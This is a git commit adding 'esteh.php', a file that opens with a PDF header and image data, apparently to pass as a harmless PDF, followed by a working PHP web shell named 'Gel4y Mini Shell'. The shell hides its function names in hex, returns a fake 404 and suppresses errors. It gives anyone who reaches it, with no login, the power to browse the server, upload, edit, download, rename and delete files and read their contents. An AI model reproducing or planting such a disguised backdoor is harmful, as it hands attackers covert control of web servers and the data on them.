53319532a67a782557026b50817d408ac18f9767
LwBee <lwbee@proton.me>
2024-12-12 12:21:44 +0700

    Add files via upload

---
+++ esteh.php
@@ -0,0 +1,275 @@
+%PDF-1.7
+%âãÏÓ
+1 0 obj 
+<<
+/ColorSpace [/Indexed /DeviceRGB 43 2 0 R]
+/Subtype /Image
+/Height 225
+/Filter /FlateDecode
+/Type /XObject
+/Width 225
+/BitsPerComponent 8
+/Length 5123
+>>
+stream
+xœí]‰–œ8	(@İ>ºİ¶ÇãkÖÇşÿÿ[.)#!³$UÑ§›İ·ûœE	”
+…Ú6\î.çœ=´nv‡Q‚S´…" êœvb”ÕÃ9)ª•lèêítU•­œ¦«üe«-xÄ»µ\]EaŠàj.y(ƒ¢¦"Óß´¥2*¦0Ë%—¡E¸†j”Ë5ÖÙG»ª	a]UŠà-ñ†-E±+ƒ­–KvŞ™ UN!X‰µ2d‚m” •ÌÊ÷Û•`#WC.C7•HP)9Ú‚;<£#•’%Aù|¢#àß• =Dš‚Fî&Lœ ò‘‰Jûnº6è» ¶VS¿K¿óö}w	ß6X@‚6Œµ³¿Š®mÂå:º(Úƒå’›î¤2 Üç€‡‹µW.ŒHlC.[…Ç¤£q‘«*ÓUQû%‡BÂo«0N,Æú†h S5¡d«€;ÓÃ:DCs‚!\ù_£96kpi;(#Tßô¡Î!ÚÈ`¸a˜ÂûÜ€+u>Àã``VsÁÏŸ	şVã™ß‰`ˆ>‚E^JÕ¸m‚sU°÷íØwoêÜğÔùT@Ğ†œœ,i"[±Á	üRÀ¥]’U 6e5ÁWáip2ƒ›ØÎà‚ÃàÂ—l˜¾èÃğ­tğ<?K‹J``â0¾€¡aÙIáR,#\FÀTguµ1mĞØ˜”ùà7êY…Ûğ"°”Ål&0…©)sØŒ	o±kVÍ¹d%mx[wŸÑSX!¨´`V«pˆî6,”’ïàŞ9™×‚÷K°ôıêCo«ísŞÁ<‚±wpJEmî§tmz§—Ó"×VŒ"iCËnHX… &mh]ÎQ—ë R~
+˜/&V„.âeĞ‚¤/&öT¶ŸÖDû×a;×‘!6ü‡K»®¢=wçƒÃ!Làş€áŞ¯Ãö®£¿ h{ 0€ÅUâñ†]¨¦´õ8Ağ¿€Ÿ Ì‰¹ğ¨Uô{ñ´á’Ä›Û"¸ÉÇ’m˜¾Ğ¨Â	‚%ğJ>,cûr™S»QÔv4ÆÏjÊ^%SXëóAzkòeğí¥,àõÁ'L™¤gÏ%¨€Ÿ	“…€Şş#º?Á‡‘6|&ø 	6>©I®c_şÌ»	Ÿ†É#H¹/Ãeµ£_t^—\Ö†qQçÇˆÅÔw/Q\¬ª ïBÆjÊªMØ2€Ç~F\¸>h)á†ãÈÀe¸á‚jWğR€™Rpş‚Lî6ËÜ$wCuÜrÍ28ç02œæ?-Ú¸å¯|t	8Éõu’úÏ¡ÎÏßM’
+ºC¸ñªd&Æ£$dÚ`»Ê–+÷DÉ‰3Ûãùª­Àa¬­‰ñ(Õ×±”_)‚Aô OKS´=bVMgˆñT‚{ÌèéË’ Î"‚'K¹ä4‹B0+'8øüÂ$ærñùj´Ä/”|×µG”¢róŠ%?‚ñœL/¿ƒYïü¼‚ñ:?r‚<• ’SQE³¡R‹ñ¤~7„¹^ ˜"Æƒ06
+‰½”Êà¸rOã
+¶Ş/k¢Ü–:›x¾’´q¡ä\1^hª<1Ş\³e
+0µï”ä
+—W=ç_ Ç¬­…ò¬Ú"ÇcÊ½%}6fÛp	›'Êæ&¸„]ãçù©teã°-™¯(…’yšXœâé=ÈP,”lºoX\Œ7×®­^Ö×q1˜,št‚#(s	Æë<V ûµ®¿Áò¹<áÅe
+‰`Rïš`3>¯ëñºˆ”å”›`Ùôïêùzõ$	º‹¿úuÈÆ+àGHĞß|uıŞÁÇCğxMõÚÓ{sÕ‚ÌGNÁİÁ& Û4ææ«ç÷²êãÊ½‚Ô¥'tX¹&\Èo±Išâex<ßºFã'W|dì’®£´á\gĞ×…ÁIQ‘t{üp‰ñÊ0´]‰ñä´aĞ×M÷»şËÓûpÕ®Ê8PV2pèjƒ°‰ñ@‡`Qw "Ì%s½ô9úº|Y~w ·Æ¢âúú&Lñè'O˜[I`®¯Ê0¦+ûë/ß>½,ŠñX¯–3£óöğŠsX“qWÿü.ÃÂµ6{ìÜ•`#,¡Îæm ÷õÚà½7H*³¦ÿt¿X¢Ì˜ß§„Ê%ß#A%Íâ	÷*ğûŞ'ÔîÁµàq‚æúCà÷¢•¿{´	9é”Ep“7—^ıvà—‚;»MT~–GğˆÆ?/õe;ê|Ä:Ÿè„`´£‚28EmØã¥oŞ¿Ş(Ê;a©Gg‰_ºz¿¸§,×Éb<e1ÑÊ`m}p\ò£Ş}iú:\,”’)mH
+6Òµqë’.D;¦uØ¾_-¸ú¥\A'†»Î¹*LmëŸÕ²YÁ¸ğKÕhå’Aæ‡[ô°m¹ô˜Œ-<GùÈÜÏŒ*–c¤L`‡»u„ÙÄğ×ôù|ãáãøÙ£Ç=¼Í&BÉ¶ŠËHèË˜6òt‰Í^xö2€¯èóòCØ»ÄÀY²¨ÌíuÇÁV³ù'#(ñ{W&ˆj¢-xÚŒ>aÂ[`£x(t¯Ê§GĞÜÀó9LûAó'>ŸMÊÉGE‡/¿¤ ˆ 1ïñık’>ŒY)y!éëşå·Øhb¼Š’(*AÆïÓ¼˜'ëëˆ WîÍµÁêWh”÷Ú¸¹ïf`3ÿ•Ïˆ11Ş¸˜ÈÄx¾v|O-ğûŸ-77lBëÜ¢
+,adÁe~¾ vãÚ8A×†R<
+‚nVáÍÿ{à:>*ÙÇ‡ÿC~?·®†¢¯›şé\ÊÚ/ÏËÿÜ¢Ù
+Ã!±›K¤Á6ã5æƒm?^gƒíRw”¬?|áæàVSîI%ƒç<ÃyYµœÙ±¢²€ïç×ÏÓª¥äd²œñ2R	›”Áy	Æ/õU<$oRVÀ·D0Gd>¿›Nª³²6Ešxÿq|]¿osê¼/Á[Új.€ß‹¶Ì¨óÖ	ê¬<ğº°xT×ßÛ¬:ïBğp»£Õ‡ú“kA›6”š5AcŞ@8@›ÓÅx2A­›€®4D;Îx4.ÊsÆƒğøgJÏD¿Ö×10ôAUıWˆ7ÌÑÆõ"¸ğDwº3y	ü.İğ/úRUÿÍí4éë|-}¬d‰
+îÅ¬Zø]ØÎ—Ò/KëÎxÎxĞÖı‡Ä2ªvæ1áõà’_;æŒ‡YµpÁ3,ŠâÊL‰ƒZıÍ'ãú:”dĞ›Ÿ.!A¨EdÂ›e£Ç	â íSX¿U6gAíò ÎÑçúÒ¯_¿¿üØî3_g
+'€ï‹ é „v
+
+A¹Acş~ï ü4âú{]¿t‡§Ö‚˜­6Ì2ôÖæŒwAóøÕ½æ·/AtÆ‹×Z»¥¥èÕêÒŠ éş~o‡ÑÔ‰™âw>ÛoÎmœñhØƒàÅÏ¯<¾~ßZ»2»³ŞÕnmv7Wƒíh¦­ÄèuÆ“Åx]ÌOoœñ~`>-7{¬e}lv7)÷ºD0ê‡3œñTW;Z‘]M—Ú|'‰Ö”	\JV¶ÉjÊ=97¿éÌkMe‘¥USÀMsñøİ˜m©¬3•±Ç|ğö–‡OÀï‹åxMÁ=|Õ–pÓ÷ 1ĞÀîğû»H$xÆ{l\uõçûË°¢€{ıôÑ6îâÅ¯yØµ|¬0æĞêáKõ°	Æò}9>Œ¦º~S<‚îòo|ğ¦/£Lçğ¸Éêd‚…ÎY|¡Làäu¦_¿ÇïÆx]N«Y[‚æQÿÁ”u”’dõ` Ó´ÊâŒ­zµ‰+plÉ¯z]¯¯kEŒIĞúMŸav·Rî…É<g<É¿n\Ëí‰éÚFW»årmøÕÚVpÆë0‰V_²dÎ¡3¬ÜëBÉ‡Ñ²¯û1Eú¹ºğ.ãçá9cY<4»k.ÿÙ0üî¶Îx=®’» @_§9ãÑXÒùìXÈ1Ê=a>˜’	ïL3>¿ÖoàUšçVMõşşWa´<RtÇÜÙ:Å5I5­3¼/W?4k‚-û]|–Ü³¶×!ÁñÏæ¿ÃÿVùúÒ{öâİA¡¡÷‹pø€Ö…J0ëÍ´;‡àÀğ'ø’d“Üy(¥Îº‚C©ÿr†A2ìq~ÙFıØ2±çxıC›'Ëí^	Jy«¨3Yõ‡¾	MÕ¾Ãø²uÆÛˆñ–¬Í©Îx%fÕ–»1g<ß•ú¾Spºâ¿,™cY´öëŒê×ñæÛ±’WÎx)Ø$g<¯º“ñX>~|»Üá$©~gVêºg<';ã	`wP„8Øöşu\îî‡ldn½î®å¿»1MV5ìó÷˜Ã©’œñ0U+;ãqğ\çõ¸Ó«8^ğ+Îx±¤“íŞs†Ó›Ó².ğO—3'Ìü>xwg¼¨ÒéĞ1.õ‹±x÷†~‘Ï¹H0EFBïFÊU˜MÙë¿®›²á_˜ËĞà	›”á†ø>x¾kKÇ¾0¯aoœX‡NĞ°o˜ùö—,ğÒÄ2Á“}Õn [*8|e„nZ6†ù‚{Ü%Áb5oúqÃşxåAuu)œ#rDmhºZ¿şÉ<PcWğê@êwC˜‰ñ o&†p]$8ã%˜İÉ`¥d
+gÕ‰à¢ëŠÏ*¿æœcjCS‘3^™åŒ·<vÒ„¡sÆ£6VñØ+àeÏÄx%}~ÁN•œñ&0SëëœâŒGvl>xÄ¯)û…ß§~åéD/oÜÏæ€eg¼‚ÇwŸUod‚¶œ è7ã¶côAM˜ñŞs·×µˆü~Vçœ7QJà<Óªİ6Ÿ¿Jÿhw?Pã®†ŸËõõsódò$ïr³ßÇHPü"~n	~lŒ~w ã©æ[0Ï¢M×W&Ì;i(¯1m²\	·9Æ¦Ú|×oÊ–´c6[‚’m‚ºø=,sÆ)¥tg<[ñ\¢íf@ºd„p¯”6œF2ÕVŒ‡à[sÆÃƒ`ÜlÁlKÙxù•
+6nÈ³\±“g³”{)b<z.£ÇÔşàÉpLínih+h1êŒ'€OÜ ©ù#±ìÓ+oû–àŒ—ãî~ÎxAüÌ¼¥oVõ_”`tÂ[ì(Æã`Z‰yõŸg±'·à=:ã]ı»–ƒmÁŞ‘3Ş´úëÊeºSŞ1ÁÓñ¦÷÷f`dw ˜•tºg¼fø¾Ÿ³„2Á¬wkw¶3*iÎrÆ+¯ëË¹t¥•½ÿ¬Î!Q_ŠbÎxRÉ$Æ+¢Y%9ã5WsÊNËşu+1^ßŠŠñœñÀd´qÍîœêŒG>z’NÕ×11^'Ï.§â¢^¦3^°ñÙnËm¼WÂ¶“œñ`to¸¯ğªõ Æcº‚<g<ùL+Íï¸æ¤‘ÏTñ œ	,"`ÌªIÎx¹Ê°•E5ª3T¦x!ßÃ[Äu2ç<&M«AÑœ#2Ÿ	>|&ø¨†HB7ağ’Yû‹†$ŠHĞr1Ï¬$ÛoNè^$xÄoéÑñøC.sÕQ°µL1wÆ“Î›°“Ùİ:Q[\sÆÃ®ñæğ¢®[Dw‹ÂëÚü`ÌîÀÀÎ¸<Ëşunu ­JV|m‹õHtÆKãU~ğ»>yÖ_ò6»-y3$¦/LıG-ãuÆ›Şz„3çƒ••{8]ÒÎD1•AàØéû8ã…ñxVM#¨Íå¬Úà|‚%#˜°‡7'e¡ÉÏtßx¼kÊâ&(÷²Ê¯ÄS$˜rÂ‚œtÚƒ`$m¸ÇQÑÌ8.JP¶Ñ»µÜİ/–U‹>¢FşŠšxsöÑ3W¼n‚òVŒ dÕl#`î_—£¯g¼XvÆ+”“gáh°œñÂåš€NÑ×ùZ¤ˆñ Œ)’piÎx
+8İv€ÚŠSëoÈÌîL ËªØÿäšqfKª3Õî4Ë#–tÚA'àLg¼8A ïJ0kÂ›·û,ïêÉó·å>U‚pÃg‚œ`Âé7"˜çŒ÷ ¦K-˜•İ‰`³m”°ôÅWÄ|2xKpg¼­6NVî‘3µ¨“ıë¦m¢¾ÎçÁ ìÀ/Z25|ÜÅx}é³½«¤“S[®©•À4¸Ü[ŒGa	lSò8‡$ÊT}å´é’Tò‰ÆqjV­ÀcsC5è†yNrVMŞ×v¶3IĞå@Â{ñ+÷äÌ’rÉ*¢Ê9Îx
+ÁİñN#øä[ğŒ¥ Áø–Ú‡AĞÊ©•»%Ù/¦½´gˆñ"`¹ÓLtÆ™Àp)ÎxÚÚ•ÁtÅ×“Î´İ€ug<ÒÆ±¥ÕàŒG*¸n‚Íê¸ÑOeÎv®’9‡ª;Ÿ„D1Şè®'Iæ²œñÜ¡rJ¦"Pç×µ™3ŞZ_·ü^	V5ìô:‡Wã‰úº4g<Æ'2 qË£¬¬š,É7üîa;V(µ“Ó†y:º_ŞäñÄIºbZğO0üÛÜÙï!Œ«³	>|&øPf}Eÿp’Êò
+endstream 
+endobj 
+2 0 obj 
+<<
+/Filter /FlateDecode
+/Length 143
+>>
+stream
+xœ„ {ÿşşşîîîÿÿÿíííììì   ïïïùùùóóóûûûòòòöööŞŞŞÅÅÅyyyXXX]]]ÖÖÖååå999½½½°°°¡¡¡¨¨¨ššš,,,µµµÊÊÊIIIàààggg///„„„sssOOO666!!!aaa’’’CCCÈLä
+endstream 
+endobj 
+3 0 obj 
+<<
+/Filter /FlateDecode
+/Length 33
+>>
+stream
+xœ+ä24³Ğ37U0 B$fr.—~„‚K>W  ƒµ7
+endstream 
+endobj 
+4 0 obj 
+<<
+/Type /Catalog
+/Pages 5 0 R
+>>
+endobj 
+5 0 obj 
+<<
+/Kids [6 0 R]
+/Type /Pages
+/Count 1
+>>
+endobj 
+6 0 obj 
+<<
+/Contents 3 0 R
+/Type /Page
+/Resources 
+<<
+/XObject 
+<<
+/X0 1 0 R
+>>
+>>
+/Parent 5 0 R
+/Rotate 0
+/MediaBox [0 0 168.75 168.75]
+/TrimBox [0 0 168.75 168.75]
+>>
+endobj xref
+0 7
+0000000000 65535 f 
+0000000015 00000 n 
+0000005331 00000 n 
+0000005549 00000 n 
+0000005656 00000 n 
+0000005707 00000 n 
+0000005766 00000 n 
+trailer
+
+<<
+/ID [(ûWaa¦T±ÍH¢¨¥‘±v) (ûWaa¦T±ÍH¢¨¥‘±v)]
+/Root 4 0 R
+/Size 7
+>>
+startxref
+5943
+%%EOF
+%PDF-1.4
+%PDF-1
+<?php
+error_reporting(0);
+http_response_code(404);
+define("self", "G\x65l\64y M\x69n\x69 Sh\x65ll");
+$scD = "s\x63\x61\x6e\x64\x69r";
+$fc = array("7068705f756e616d65", "70687076657273696f6e", "676574637764", "6368646972", "707265675f73706c6974", "61727261795f64696666", "69735f646972", "69735f66696c65", "69735f7772697461626c65", "69735f7265616461626c65", "66696c6573697a65", "636f7079", "66696c655f657869737473", "66696c655f7075745f636f6e74656e7473", "66696c655f6765745f636f6e74656e7473", "6d6b646972", "72656e616d65", "737472746f74696d65", "68746d6c7370656369616c6368617273", "64617465", "66696c656d74696d65");
+for ($i = 0; $i < count($fc); $i++) {
+	$fc[$i] = nhx($fc[$i]);
+}
+if (isset($_GET["p"])) {
+	$p = nhx($_GET["p"]);
+	$fc[3](nhx($_GET["p"]));
+} else {
+	$p = $fc[2]();
+}
+function hex($str) {
+	$r = "";
+	for ($i = 0; $i < strlen($str); $i++) {
+		$r .= dechex(ord($str[$i]));
+	}
+	return $r;
+}
+function nhx($str) {
+	$r = "";
+	$len = (strlen($str) -1);
+	for ($i = 0; $i < $len; $i += 2) {
+		$r .= chr(hexdec($str[$i].$str[$i+1]));
+	}
+	return $r;
+}
+function perms($f) {
+	$p = fileperms($f);
+	if (($p & 0xC000) == 0xC000) {
+		$i = 's';
+	} elseif (($p & 0xA000) == 0xA000) {
+		$i = 'l';
+	} elseif (($p & 0x8000) == 0x8000) {
+		$i = '-';
+	} elseif (($p & 0x6000) == 0x6000) {
+		$i = 'b';
+	} elseif (($p & 0x4000) == 0x4000) {
+		$i = 'd';
+	} elseif (($p & 0x2000) == 0x2000) {
+		$i = 'c';
+	} elseif (($p & 0x1000) == 0x1000) {
+		$i = 'p';
+	} else {
+		$i = 'u';
+	}
+	$i .= (($p & 0x0100) ? 'r' : '-');
+	$i .= (($p & 0x0080) ? 'w' : '-');
+	$i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x') : (($p & 0x0800) ? 'S' : '-'));
+	$i .= (($p & 0x0020) ? 'r' : '-');
+	$i .= (($p & 0x0010) ? 'w' : '-');
+	$i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x') : (($p & 0x0400) ? 'S' : '-'));
+	$i .= (($p & 0x0004) ? 'r' : '-');
+	$i .= (($p & 0x0002) ? 'w' : '-');
+	$i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x') : (($p & 0x0200) ? 'T' : '-'));
+	return $i;
+}
+function a($msg, $sts = 1, $loc = "") {
+	global $p;
+	$status = (($sts == 1) ? "success" : "error");
+	echo "<script>swal({title: \"{$status}\", text: \"{$msg}\", icon: \"{$status}\"}).then((btnClick) => {if(btnClick){document.location.href=\"?p=".hex($p).$loc."\"}})</script>";
+}
+function deldir($d) {
+	global $fc;
+	if (trim(pathinfo($d, PATHINFO_BASENAME), '.') === '') return;
+	if ($fc[6]($d)) {
+		array_map("deldir", glob($d . DIRECTORY_SEPARATOR . '{,.}*', GLOB_BRACE | GLOB_NOSORT));
+		rmdir($d);
+	} else {
+		unlink($d);
+	}
+}
+?>
+<!doctype html>
+<!-- RandsX aka T1kus_g0t -->
+<html lang="en"><head><meta name="theme-color" content="red"><meta name="viewport" content="width=device-width, initial-scale=0.60, shrink-to-fit=no"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"><title><?= self ?></title><style>.table-hover tbody tr:hover td{background:red}.table-hover tbody tr:hover td>*{color:#fff}.table>tbody>tr>*{color:#fff;vertical-align:middle}.form-control{background:0 0!important;color:#fff!important;border-radius:0}.form-control::placeholder{color:#fff;opacity:1}li{font-size:18px;margin-left:6px;list-style:none}a{color:#fff}</style><script src="//unpkg.com/sweetalert/dist/sweetalert.min.js"></script></head><body style="background-color:#000;color:#fff;font-family:serif;"><div class="bg-dark table-responsive text-light border"><div class="d-flex justify-content-between p-1"><div><h3 class="mt-2"><a href="?"><?= self ?></a></h3></div><div><span>PHP Version : <?= $fc[1]() ?></span> <br><a href="?p=<?= hex($p)."&a=".hex("newFile") ?>">+File</a><a href="?p=<?= hex($p)."&a=".hex("newDir") ?>">+Directory</a></div></div><div class="border-top table-responsive"><li>Uname : <?= $fc[0]() ?></li></div><form method="post" enctype="multipart/form-data"><div class="input-group mb-1 px-1 mt-1"><div class="custom-file"><input type="file" name="f[]" class="custom-file-input" onchange="this.form.submit()" multiple><label class="custom-file-label rounded-0 bg-transparent text-light">Choose file</label></div></div></form>
+<?php
+if (isset($_FILES["f"])) {
+	$n = $_FILES["f"]["name"];
+	for ($i = 0; $i < count($n); $i++) {
+		if ($fc[11]($_FILES["f"]["tmp_name"][$i], $n[$i])) {
+			a("file uploaded successfully");
+		} else {
+			a("file failed to upload", 0);
+		}
+	}
+}
+if (isset($_GET["download"])) {
+	header("Content-Type: application/octet-stream");
+	header("Content-Transfer-Encoding: Binary");
+	header("Content-Length: ".$fc[17](nhx($_GET["n"])));
+	header("Content-disposition: attachment; filename=\"".nhx($_GET["n"])."\"");
+}
+?>
+</div><div class="bg-dark border table-responsive mt-2"><div class="ml-2" style="font-size:18px;"><span>Path: </span>
+<?php
+$ps = $fc[4]("/(\\\|\/)/", $p);
+foreach ($ps as $k => $v) {
+	if ($k == 0 && $v == "") {
+		echo "<a href=\"?p=2f\">~</a>/"; continue;
+	}
+	if ($v == "") continue;
+	echo "<a href=\"?p=";
+	for ($i = 0; $i <= $k; $i++) {
+		echo hex($ps[$i]);
+		if ($i != $k) echo "2f";
+	}
+	echo "\">{$v}</a>/";
+}
+?>
+</div></div><article class="bg-dark border table-responsive mt-2">
+<?php if (!isset($_GET["a"])): ?>
+<table class="table table-hover table-borderless table-sm"><thead class="text-light"><tr><th>Name</th><th>Size</th><th>Permission</th><th>Action</th></tr></thead><tbody class="text-light">
+<?php
+$scD = $fc[5]($scD($p), [".", ".."]);
+foreach ($scD as $d) {
+	if (!$fc[6]("$p/$d")) continue;
+	echo "<tr><td><a href=\"?p=".hex("$p/$d")."\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on ".$fc[19]("Y-m-d H:i", $fc[20]("$p/$d"))."\"><i class=\"fa fa-fw fa-folder\"></i> {$d}</a></td><td>N/A</td><td><font color=\"".(($fc[8]("$p/$d")) ? "#00ff00" : (!$fc[9]("$p/$d") ? "red" : null))."\">".perms("$p/$d")."</font></td><td><a href=\"?p=".hex($p)."&a=".hex("rename")."&n=".hex($d)."&t=d\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\"><i class=\"fa fa-fw fa-pencil\"></i></a><a href=\"?p=".hex($p)."&a=".hex("delete")."&n=".hex($d)."\" class=\"delete\" data-type=\"folder\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\"><i class=\"fa fa-fw fa-trash\"></i></a></td></tr>";
+}
+foreach ($scD as $f) {
+	if (!$fc[7]("$p/$f")) continue;
+	$sz = $fc[10]("$p/$f")/1024;
+	$sz = round($sz, 3);
+	$sz = ($sz > 1024) ? round($sz/1024, 2)."MB" : $sz."KB";
+	echo "<tr><td><a href=\"?p=".hex($p)."&a=".hex("view")."&n=".hex($f)."\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on ".$fc[19]("Y-m-d H:i", $fc[20]("$p/$f"))."\"><i class=\"fa fa-fw fa-file\"></i> {$f}</a></td><td>{$sz}</td><td><font color=\"".(($fc[8]("$p/$f")) ? "#00ff00" : (!$fc[9]("$p/$f") ? "red" : null))."\">".perms("$p/$f")."</font></td><td><div class=\"d-flex justify-content-between\"><a href=\"?p=".hex($p)."&a=".hex("edit")."&n=".hex($f)."\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Edit\"><i class=\"fa fa-fw fa-edit\"></i></a><a href=\"?p=".hex($p)."&a=".hex("rename")."&n=".hex($f)."&t=f\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\"><i class=\"fa fa-fw fa-pencil\"></i></a><a href=\"?p=".hex($p)."&n=".hex($f)."&download"."\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Download\"><i class=\"fa fa-fw fa-download\"></i></a><a href=\"?p=".hex($p)."&a=".hex("delete")."&n=".hex($f)."\" class=\"delete\" data-type=\"file\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\"><i class=\"fa fa-fw fa-trash\"></i></a></div></td></tr>";
+}
+?></tbody></table>
+<?php else :if (isset($_GET["a"])) $a = nhx($_GET["a"]); ?>
+<div class="px-2 py-2">
+<?php if ($a == "delete") {
+	$loc = $p.'/'.nhx($_GET["n"]);
+	if ($_GET["t"] == "d") {
+		deldir($loc);
+		if (!$fc[12]($loc)) {
+			a("folder deleted successfully");
+		} else {
+			a("failed to delete the folder", 0);
+		}
+	}
+	if ($_GET["t"] == "f") {
+		$loc = $p.'/'.nhx($_GET["n"]);
+		unlink($loc);
+		if (!$fc[12]($loc)) {
+			a("file deleted successfully");
+		} else {
+			a("file to delete the folder", 0);
+		}
+	}
+}
+?>
+<?php if ($a == "newDir"): ?>
+<h5 class="border p-1 mb-3">New folder</h5>
+<form method="post"><div class="form-group"><label for="n">Name :</label><input name="n" id="n" class="form-control" autocomplete="off"></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Create</button></div></form>
+<?php ((isset($_POST["s"])) ? ($fc[12]("$p/{$_POST["n"]}") ? a("folder name has been used", 0, "&a=".hex("newDir")) : ($fc[15]("$p/{$_POST["n"]}") ? a("folder created successfully") : a("folder failed to create", 0))) : null); elseif ($a == "newFile"): ?>
+<h5 class="border p-1 mb-3">New file</h5>
+<form method="post"><div class="form-group"><label for="n">File name :</label><input type="text" name="n" id="n" class="form-control" placeholder="hack.txt"></div><div class="form-group"><label for="ctn">Content :</label><textarea style="resize:none" name="ctn" id="ctn" cols="30" rows="10" class="form-control" placeholder="# Stamped By Me"></textarea></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Create</button></div></form>
+<?php ((isset($_POST["s"])) ? ($fc[12]("$p/{$_POST["n"]}") ? a("file name has been used", 0, "&a=".hex("newFile")) : ($fc[13]("$p/{$_POST["n"]}", $_POST["ctn"]) ? a("file created successfully",1,"&a=".hex("view")."&n=".hex($_POST["n"])) : a("file failed to create", 0))) : null); elseif ($a == "rename"): ?>
+<h5 class="border p-1 mb-3">Rename <?= (($_GET["t"] == "d") ? "folder" : "file") ?></h5>
+<form method="post"><div class="form-group"><label for="n">Name :</label><input type="text" name="n" id="n" class="form-control" value="<?= nhx($_GET["n"]) ?>"></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button></div></form>
+<?php ((isset($_POST["s"])) ? ($fc[16]($p.'/'.nhx($_GET["n"]), $_POST["n"]) ? a("successfully changed the folder name") : a("failed to change the folder name", 0)) : null); elseif ($a == "edit"): ?>
+<h5 class="border p-1 mb-3">Edit file</h5>
+<span>File name : <?= nhx($_GET["n"]) ?></span>
+<form method="post"><div class="form-group"><label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control"><?= $fc[18]($fc[14]($p.'/'.nhx($_GET["n"]))) ?></textarea></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button></div></form>
+<?php ((isset($_POST["s"])) ? ($fc[13]($p.'/'.nhx($_GET["n"]), $_POST["ctn"]) ? a("file contents changed successfully", 1, "&a=".hex("view")."&n={$_GET["n"]}") : a("file contents failed to change")) : null); elseif ($a == "view"): ?>
+<h5 class="border p-1 mb-3">View file</h5>
+<span>File name : <?= nhx($_GET["n"]) ?></span>
+<div class="form-group"><label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control" readonly><?= $fc[18]($fc[14]($p.'/'.nhx($_GET["n"]))) ?></textarea></div><?php endif; ?></div><?php endif; ?></article><div class="bg-dark border text-center mt-2"><small>Copyright &copy; 2021 - Powered By INDONESIAN SECURE SYSTEM'</small></div><script src="//code.jquery.com/jquery-3.5.1.slim.min.js"></script><script src="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.bundle.min.js" ></script><script src="//cdn.jsdelivr.net/npm/bs-custom-file-input/dist/bs-custom-file-input.min.js"></script><script>eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('E.n();$(\'[2-m="4"]\').4();$(".l").k(j(e){e.g();h 0=$(6).5("2-0");c({b:"a",9:"o i q?",w:"D "+0+" p C B",A:7,z:7,}).y((8)=>{r(8){x 1=$(6).5("3")+"&t="+((0=="v")?"d":"f");u.s.3=1}})});',41,41,'type|buildURL|data|href|tooltip|attr|this|true|willDelete|title|warning|icon|swal||||preventDefault|let|you|function|click|delete|toggle|init|Are|will|sure|if|location||document|folder|text|const|then|dangerMode|buttons|deleted|be|This|bsCustomFileInput'.split('|'),0,{}))</script></body></html>
